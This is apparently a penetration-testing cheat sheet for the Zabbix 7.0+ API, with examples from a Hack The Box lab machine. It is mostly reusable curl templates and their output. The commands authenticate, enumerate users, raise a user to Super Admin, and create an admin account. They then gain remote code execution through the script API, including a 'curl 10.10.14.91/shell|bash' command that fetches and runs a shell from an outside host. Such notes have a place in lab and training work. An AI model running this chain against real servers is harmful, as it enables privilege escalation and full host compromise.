---
title: "Zabbix"
date: 2025-3-2
tags: ["Zabbix", "Api", "Monitoring", "Web Exploitation", "RCE"]
---

### Zabbix 7.0+ API

#### Check Zabbix Version

```console
curl -s <TARGET>/zabbix/api_jsonrpc.php -H 'Content-Type: application/json-rpc' -d '{"jsonrpc":"2.0","method":"apiinfo.version","params":{},"id":1}' | jq .
```

```console {class="sample-code"}
┌──(kali㉿kali)-[~]
└─$ curl -s http://unrested.htb/zabbix/api_jsonrpc.php -H 'Content-Type: application/json-rpc' -d '{"jsonrpc":"2.0","method":"apiinfo.version","params":{},"id":1}' | jq .
{
  "jsonrpc": "2.0",
  "result": "7.0.0",
  "id": 1
}
```

#### Authentication

```console
curl -s <TARGET>/zabbix/api_jsonrpc.php -H 'Content-Type: application/json-rpc' -d '{"jsonrpc":"2.0","method":"user.login","params":{"username":"<USER>","password":"<PASSWORD>"},"id":1}' | jq .
```

```console {class="sample-code"}
┌──(kali㉿kali)-[~]
└─$ curl -s http://unrested.htb/zabbix/api_jsonrpc.php -H 'Content-Type: application/json-rpc' -d '{"jsonrpc":"2.0","method":"user.login","params":{"username":"matthew","password":"96qzn0h2e1k3"},"id":1}' | jq .
{
  "jsonrpc": "2.0",
  "result": "d983875587424cdbc8d3182166e11580",
  "id": 1
}
```

#### Get Users

```console
curl -s <TARGET>/zabbix/api_jsonrpc.php -H 'Content-Type: application/json-rpc' -H 'Authorization: Bearer <AUTHORIZATION_TOKEN>' -d '{"jsonrpc":"2.0","method":"user.get","params":{"output":"extend"},"id":1}' | jq .
```

```console {class="sample-code"}
┌──(kali㉿kali)-[~]
└─$ curl -s http://unrested.htb/zabbix/api_jsonrpc.php -H 'Content-Type: application/json-rpc' -H 'Authorization: Bearer 3ab7e805fdba122decc16b304093ea02' -d '{"jsonrpc":"2.0","method":"user.get","params":{"output":"extend"},"id":1}' | jq .
{
  "jsonrpc": "2.0",
  "result": [
    {
      "userid": "1",
      "username": "Admin",
      "name": "Zabbix",
      "surname": "Administrator",
      "url": "",
      "autologin": "1",
      "autologout": "0",
      "lang": "default",
      "refresh": "30s",
      "theme": "default",
      "attempt_failed": "0",
      "attempt_ip": "",
      "attempt_clock": "0",
      "rows_per_page": "50",
      "timezone": "default",
      "roleid": "3",
      "userdirectoryid": "0",
      "ts_provisioned": "0"
    },
---[SNIP]---
}
```

#### Get Hosts

```console
curl -s <TARGET>/zabbix/api_jsonrpc.php -H 'Content-Type: application/json-rpc' -H 'Authorization: Bearer <AUTHORIZATION_TOKEN>' -d '{"jsonrpc":"2.0","method":"host.get","params":{},"id":1}' | jq .
```

```console {class="sample-code"}
┌──(kali㉿kali)-[~]
└─$ curl -s http://unrested.htb/zabbix/api_jsonrpc.php -H 'Content-Type: application/json-rpc' -H 'Authorization: Bearer f7a1ea8aeb93db663935a99ffb6ade92' -d '{"jsonrpc":"2.0","method":"host.get","params":{},"id":1}' | jq .
{
  "jsonrpc": "2.0",
  "result": [
    {
      "hostid": "10084",
      "proxyid": "0",
      "host": "Zabbix server",
      "status": "0",
      "ipmi_authtype": "-1",
      "ipmi_privilege": "2",
      "ipmi_username": "",
      "ipmi_password": "",
      "maintenanceid": "0",
      "maintenance_status": "0",
      "maintenance_type": "0",
      "maintenance_from": "0",
      "name": "Zabbix server",
      "flags": "0",
      "templateid": "0",
      "description": "",
      "tls_connect": "1",
      "tls_accept": "1",
      "tls_issuer": "",
      "tls_subject": "",
      "custom_interfaces": "0",
      "uuid": "",
      "vendor_name": "",
      "vendor_version": "",
      "proxy_groupid": "0",
      "monitored_by": "0",
      "inventory_mode": "1",
      "active_available": "1",
      "assigned_proxyid": "0"
    }
  ],
  "id": 1
}
```

#### Get User Group Info

```console
curl -s <TARGET>/zabbix/api_jsonrpc.php -H 'Content-Type: application/json-rpc' -H 'Authorization: Bearer <AUTHORIZATION_TOKEN>' -d '{"jsonrpc":"2.0","method":"usergroup.get","params":{"userids":"<USER_IDS>"},"id":1}' | jq .
```

```console {class="sample-code"}
┌──(kali㉿kali)-[~]
└─$ curl -s http://unrested.htb/zabbix/api_jsonrpc.php -H 'Content-Type: application/json-rpc' -H 'Authorization: Bearer 3ab7e805fdba122decc16b304093ea02' -d '{"jsonrpc":"2.0","method":"usergroup.get","params":{"userids":"1"},"id":1}' | jq .
{
  "jsonrpc": "2.0",
  "result": [
    {
      "usrgrpid": "7",
      "name": "Zabbix administrators",
      "gui_access": "0",
      "users_status": "0",
      "debug_mode": "0",
      "userdirectoryid": "0",
      "mfa_status": "0",
      "mfaid": "0"
    },
    {
      "usrgrpid": "13",
      "name": "Internal",
      "gui_access": "1",
      "users_status": "0",
      "debug_mode": "0",
      "userdirectoryid": "0",
      "mfa_status": "0",
      "mfaid": "0"
    }
  ],
  "id": 1
}
```

#### Update User Group Info

```console
# e.g. GUI Access
curl -s <TARGET>/zabbix/api_jsonrpc.php -H 'Content-Type: application/json-rpc' -H 'Authorization: Bearer <AUTHORIZATION_TOKEN>' -d '{"jsonrpc":"2.0","method":"usergroup.update","params":{"usrgrpid":"<USR_GRP_ID>","gui_access":"0"},"id":1}' | jq .
```

```console {class="sample-code"}
┌──(kali㉿kali)-[~]
└─$ curl -s http://unrested.htb/zabbix/api_jsonrpc.php -H 'Content-Type: application/json-rpc' -H 'Authorization: Bearer f7a1ea8aeb93db663935a99ffb6ade92' -d '{"jsonrpc":"2.0","method":"usergroup.update","params":{"usrgrpid":"8","gui_access":"0"},"id":1}' | jq .
{
  "jsonrpc": "2.0",
  "result": {
    "usrgrpids": [
      "8"
    ]
  },
  "id": 1
}
```

#### Update User

```console
# e.g. Update User Role to Super Admin
curl -s <TARGET>/zabbix/api_jsonrpc.php -H 'Content-Type: application/json-rpc' -H 'Authorization: Bearer <AUTHORIZATION_TOKEN>' -d '{"jsonrpc":"2.0","method":"user.update","params":{"userid":"<USER_ID>","roleid":"3"},"id":1}' | jq .
```

```console {class="sample-code"}
┌──(kali㉿kali)-[~]
└─$ curl -s http://unrested.htb/zabbix/api_jsonrpc.php -H 'Content-Type: application/json-rpc' -H 'Authorization: Bearer f7a1ea8aeb93db663935a99ffb6ade92' -d '{"jsonrpc":"2.0","method":"user.update","params":{"userid":"3","roleid":"3"},"id":1}' | jq .
{
  "jsonrpc": "2.0",
  "result": {
    "userids": [
      "3"
    ]
  },
  "id": 1
}
```

#### Create User

```console
# e.g. With Super Admin Role
curl -s <TARGET>/zabbix/api_jsonrpc.php -H 'Content-Type: application/json-rpc' -H 'Authorization: Bearer <AUTHORIZATION_TOKEN>' -d '{"jsonrpc":"2.0","method":"user.create","params":{"username":"<NEW_USER>","passwd":"<NEW_PASSWORD>","roleid":"3","usrgrps":[{"usrgrpid":"<USR_GRP_ID>"}]},"id":1}' | jq .
```

```console {class="sample-code"}
┌──(kali㉿kali)-[~]
└─$ curl -s http://unrested.htb/zabbix/api_jsonrpc.php -H 'Content-Type: application/json-rpc' -H 'Authorization: Bearer f7a1ea8aeb93db663935a99ffb6ade92' -d '{"jsonrpc":"2.0","method":"user.create","params":{"username":"test","passwd":"Test1234!@","roleid":"3","usrgrps":[{"usrgrpid":"7"}]},"id":1}' | jq .
{
  "jsonrpc": "2.0",
  "result": {
    "userids": [
      "4"
    ]
  },
  "id": 1
}
```

<br>

---

### RCE

#### Create Script

```console
# Default Container: 1
curl -s <TARGET>/zabbix/api_jsonrpc.php -H 'Content-Type: application/json-rpc' -H 'Authorization: Bearer <AUTHORIZATION_TOKEN>' -d '{"jsonrpc":"2.0","method":"script.create","params":{"command":"<CMD>","name":"<SCRIPT_NAME>","execute_on":<CONTAINER>,"scope":2,"type":0},"id":1}' | jq .
```

```console {class="sample-code"}
┌──(kali㉿kali)-[~]
└─$ curl -s http://unrested.htb/zabbix/api_jsonrpc.php -H 'Content-Type: application/json-rpc' -H 'Authorization: Bearer 46ce4c5a0a7fdbbd8b9591bb08d4854c' -d '{"jsonrpc":"2.0","method":"script.create","params":{"command":"id","name":"test","execute_on":0,"scope":2,"type":0},"id":1}' | jq .
{
  "jsonrpc": "2.0",
  "result": {
    "scriptids": [
      "4"
    ]
  },
  "id": 1
}
```

#### Update Script

```console
curl -s <TARGET>/zabbix/api_jsonrpc.php -H 'Content-Type: application/json-rpc' -H 'Authorization: Bearer <AUTHORIZATION_TOKEN>' -d '{"jsonrpc":"2.0","method":"script.update","params":{"scriptid":<SCRIPT_ID>,"command":"<CMD>"},"id":1}' | jq .
```

```console {class="sample-code"}
┌──(kali㉿kali)-[~]
└─$ curl -s http://unrested.htb/zabbix/api_jsonrpc.php -H 'Content-Type: application/json-rpc' -H 'Authorization: Bearer 46ce4c5a0a7fdbbd8b9591bb08d4854c' -d '{"jsonrpc":"2.0","method":"script.update","params":{"scriptid":4,"command":"curl 10.10.14.91/shell|bash"},"id":1}' | jq .
{
  "jsonrpc": "2.0",
  "result": {
    "scriptids": [
      "4"
    ]
  },
  "id": 1
}
```

#### Execute Script

```console
curl -s <TARGET>/zabbix/api_jsonrpc.php -H 'Content-Type: application/json-rpc' -H 'Authorization: Bearer <AUTHORIZATION_TOKEN>' -d '{"jsonrpc":"2.0","method":"script.execute","params":{"hostid":<HOST_ID>,"scriptid":<SCRIPT_ID>},"id":1}' | jq .
```

```console {class="sample-code"}
┌──(kali㉿kali)-[~]
└─$ curl -s http://unrested.htb/zabbix/api_jsonrpc.php -H 'Content-Type: application/json-rpc' -H 'Authorization: Bearer 46ce4c5a0a7fdbbd8b9591bb08d4854c' -d '{"jsonrpc":"2.0","method":"script.execute","params":{"hostid":10084,"scriptid":4},"id":1}' | jq .
{
  "jsonrpc": "2.0",
  "result": {
    "response": "success",
    "value": "uid=114(zabbix) gid=121(zabbix) groups=121(zabbix)",
    "debug": []
  },
  "id": 1
}
```
